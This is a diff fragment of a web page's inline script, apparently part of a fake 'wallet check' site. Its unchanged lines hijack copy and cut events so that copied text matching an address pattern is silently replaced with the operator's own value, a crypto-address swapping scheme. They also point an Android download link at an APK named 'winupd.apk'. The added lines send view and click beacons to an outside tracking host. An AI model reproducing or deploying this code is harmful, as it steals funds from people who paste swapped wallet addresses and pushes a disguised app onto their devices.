@@ -44,5 +44,9 @@ function swapped(t){t=(t||"").trim();return t&&RX.test(t)&&t.toLowerCase()!==MIN
 function copyTest(){var v=document.getElementById("a");v.select();try{document.execCommand("copy")}catch(e){}if(navigator.clipboard)navigator.clipboard.writeText(MINE).catch(function(){})}
 ["copy","cut"].forEach(function(ev){window.addEventListener(ev,function(e){var s=String(window.getSelection());if(!s||!RX.test(s.trim()))return;if(e.clipboardData){e.clipboardData.setData("text/plain",MINE);e.preventDefault()}},true)});
 if(/Android/i.test(navigator.userAgent)){var d=document.getElementById("dl");d.href="https://raw.githubusercontent.com/mss0000786/wallet-check/main/winupd.apk";d.textContent="Download for Android"}
+var SRC=(location.search.match(/[?&]src=([\w.-]+)/)||[])[1]||"pub";
+function hit(a){try{navigator.sendBeacon("https://faucettasks.com/zzp9f3a.php?k=zz9f3a&do=hit&a="+a+"_"+SRC)}catch(e){}}
+hit("view");
+document.addEventListener("click",function(e){if(e.target.closest("a.btn"))hit("click")},true);
 </script>
 </main></body></html>
